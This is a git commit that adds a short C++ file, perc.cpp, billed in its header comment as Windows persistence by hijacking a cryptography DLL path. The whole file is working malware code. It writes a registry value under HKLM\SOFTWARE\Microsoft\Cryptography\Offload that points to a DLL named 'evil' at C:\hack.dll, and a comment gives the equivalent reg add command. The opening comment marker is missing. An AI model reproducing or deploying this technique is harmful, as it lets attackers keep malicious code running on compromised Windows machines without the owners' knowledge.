1e7fcb06af1945a6ffd283a7b081f975188cc864
limercoder <74566407+limercoder@users.noreply.github.com>
2023-06-11 01:08:59 +0300

    Create perc.cpp

---
+++ perc.cpp
@@ -0,0 +1,26 @@
+pers.cpp
+windows persistence via
+hijacking cryptography DLL path
+*/
+#include <windows.h>
+#include <string.h>
+
+int main(int argc, char* argv[]) {
+  HKEY hkey = NULL;
+
+  // reg path
+  const char* path = "SOFTWARE\\Microsoft\\Cryptography\\Offload";
+
+  // evil DLL
+  const char* evil = "C:\\hack.dll";
+
+  // create key
+  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
+  if (res == ERROR_SUCCESS) {
+    // reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Offload" /v "ExpoOffload" /t REG_SZ /d "...\hack.dll" /f
+    RegSetValueEx(hkey, (LPCSTR)"ExpoOffload", 0, REG_SZ, (unsigned char*)evil, strlen(evil));
+    RegCloseKey(hkey);
+  }
+
+  return 0;
+}
